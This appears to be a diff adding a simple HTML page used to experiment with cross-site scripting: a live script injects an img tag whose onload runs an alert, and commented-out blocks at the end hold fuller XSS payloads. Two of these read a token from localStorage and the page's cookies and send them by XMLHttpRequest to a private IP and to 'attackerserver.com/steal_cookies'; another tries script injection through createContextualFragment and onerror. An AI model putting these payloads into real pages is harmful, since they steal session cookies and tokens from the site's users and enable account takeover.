@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Homepage</title>
+    <style>
+        /* CSS styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        /* other CSS styles */
+    </style>
+</head>
+<body>
+    <div class="container">
+        hello world
+    </div>
+
+    <div id="hero">
+
+    </div>
+<script>
+ 
+   // Check if the element with ID "hero" exists
+const heroElement = document.getElementById('hero');
+console.log(heroElement)
+if (heroElement) {
+    // Fix the typo in innerHTML
+    heroElement.innerHTML = `
+        <img src="https://webkit.org/demos/srcset/image-src.png" onload="alert('test');this.parentNode.removeChild(this);" />
+    `;
+}
+
+    
+</script>
+
+</body>
+</html>
+
+
+<!--
+<img src="https://webkit.org/demos/srcset/image-src.png" 
+    onload="(() => {
+        alert('aggga');
+    })()" /> 
+-->
+<!-- <img src="https://webkit.org/demos/srcset/image-src.png" 
+    onload="(() => {
+        alert('aggga');
+   
+        const training = JSON.parse(localStorage.getItem('training'));
+        var token=training['token']
+
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://192.168.10.81:8000/socialmedia/a?apple=' + token, true);
+        xhr.send();
+    })()" /> -->
+
+<!-- <img src="https://webkit.org/demos/srcset/image-src.png" 
+    onload="(() => {
+        alert('aggga');
+   
+        var stolenCookies = document.cookie;
+        console.log(stolenCookies, 'hi man k chhaaa');
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://attackerserver.com/steal_cookies?data=' + encodeURIComponent(stolenCookies), true);
+        xhr.send();
+    })()" /> -->
+
+
+
+<!-- 
+const html =
+  `<script>
+      alert('👋 there ! Wanna grab a 🍺'); 
+  </script>`;
+
+const scriptEl = document.createRange().createContextualFragment(html);
+ document.getElementById('hero').append(scriptEl);
+
+    document.getElementById('hero').innertHTML = `
+    <img src="empty.gif" onerror="alert('test');this.parentNode.removeChild(this);" />
+    `; -->
